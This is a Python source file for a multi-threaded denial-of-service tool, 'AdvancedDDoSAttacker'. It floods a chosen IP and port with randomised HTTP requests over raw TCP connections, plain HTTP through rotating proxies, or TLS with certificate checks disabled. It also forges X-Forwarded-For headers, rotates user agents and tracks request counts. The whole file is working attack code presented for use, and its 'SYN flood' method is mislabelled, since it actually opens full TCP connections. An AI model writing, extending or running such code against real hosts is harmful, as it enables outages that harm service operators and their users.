import threading
import socket
import time
import random
from datetime import datetime
from typing import Dict, List
import requests
import ssl

class AdvancedDDoSAttacker:
    def __init__(self, target_ip: str, target_port: int, threads: int = 2000):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = min(max(threads, 1), 10000)  # Increased max threads
        self.is_attacking = False
        self.attack_threads = []
        self.user_agents = self._load_user_agents()
        self.proxies = self._load_proxies()
        self.stats = {
            'start_time': None,
            'total_requests': 0,
            'success_requests': 0,
            'failed_requests': 0,
            'bandwidth_used': 0
        }
        self._lock = threading.Lock()
        self._stop_event = threading.Event()

    def _load_user_agents(self) -> List[str]:
        """Load diverse user agents"""
        return [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Mozilla/5.0 (Linux; Android 10; SM-G980F)',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3)',
            'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0)',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
        ]

    def _load_proxies(self) -> List[str]:
        """Load proxies from file if available"""
        try:
            with open('proxies.txt', 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def _update_stats(self, success: bool, bytes_sent: int = 0) -> None:
        """Thread-safe stats updating"""
        with self._lock:
            self.stats['total_requests'] += 1
            self.stats['bandwidth_used'] += bytes_sent
            if success:
                self.stats['success_requests'] += 1
            else:
                self.stats['failed_requests'] += 1

    def _generate_random_payload(self) -> bytes:
        """Generate random HTTP payload"""
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD']
        paths = ['/', '/wp-admin', '/api/v1', '/search', '/login']
        params = ['?q='+str(random.randint(1,10000)), 
                 '?id='+str(random.randint(100,999)),
                 '?search='+random.choice(['test','admin','debug'])]
        
        payload = (f"{random.choice(methods)} {random.choice(paths)}{random.choice(params)} HTTP/1.1\r\n"
                  f"Host: {self.target_ip}\r\n"
                  f"User-Agent: {random.choice(self.user_agents)}\r\n"
                  f"Accept: */*\r\n"
                  f"Connection: keep-alive\r\n"
                  f"X-Forwarded-For: {'.'.join(str(random.randint(1,255)) for _ in range(4))}\r\n\r\n")
        
        return payload.encode()

    def _syn_flood(self) -> None:
        """Enhanced SYN flood with socket reuse"""
        while not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                
                # Send multiple packets per connection
                for _ in range(random.randint(3,10)):
                    payload = self._generate_random_payload()
                    s.sendall(payload)
                    self._update_stats(True, len(payload))
                    time.sleep(random.uniform(0.1, 0.5))
                
                s.close()
            except Exception as e:
                self._update_stats(False)
                time.sleep(0.1)

    def _http_flood(self) -> None:
        """Advanced HTTP flood with keep-alive"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': '*/*',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache'
        }
        
        while not self._stop_event.is_set():
            try:
                # Use proxy if available
                proxy = {'http': random.choice(self.proxies)} if self.proxies else None
                
                # Randomize request types
                if random.choice([True, False]):
                    response = requests.get(
                        f"http://{self.target_ip}:{self.target_port}",
                        headers=headers,
                        proxies=proxy,
                        timeout=5
                    )
                else:
                    response = requests.post(
                        f"http://{self.target_ip}:{self.target_port}",
                        headers=headers,
                        data=random._urandom(1024),
                        proxies=proxy,
                        timeout=5
                    )
                
                self._update_stats(True, len(response.content))
            except:
                self._update_stats(False)

    def _ssl_flood(self) -> None:
        """HTTPS flood attack"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        while not self._stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.target_ip, self.target_port))
                ssock = context.wrap_socket(s, server_hostname=self.target_ip)
                
                for _ in range(random.randint(3,7)):
                    payload = self._generate_random_payload()
                    ssock.sendall(payload)
                    self._update_stats(True, len(payload))
                    time.sleep(random.uniform(0.1, 0.3))
                
                ssock.close()
            except:
                self._update_stats(False)

    def start_attack(self, attack_type: str = "syn") -> None:
        """Start enhanced attack"""
        if self.is_attacking:
            return

        self._stop_event.clear()
        self.is_attacking = True
        self.stats = {
            'start_time': datetime.now(),
            'total_requests': 0,
            'success_requests': 0,
            'failed_requests': 0,
            'bandwidth_used': 0
        }

        attack_method = {
            'syn': self._syn_flood,
            'http': self._http_flood,
            'ssl': self._ssl_flood
        }.get(attack_type.lower(), self._syn_flood)

        # Start attack threads
        for _ in range(self.threads):
            t = threading.Thread(target=attack_method)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)

    def stop_attack(self) -> Dict:
        """Stop attack and return final stats"""
        self._stop_event.set()
        self.is_attacking = False

        for t in self.attack_threads:
            t.join(timeout=1)

        duration = datetime.now() - self.stats['start_time']
        self.stats['duration'] = str(duration)
        self.stats['requests_per_sec'] = self.stats['total_requests'] / max(duration.total_seconds(), 1)
        self.stats['bandwidth_mb'] = self.stats['bandwidth_used'] / (1024 * 1024)

        return self.stats
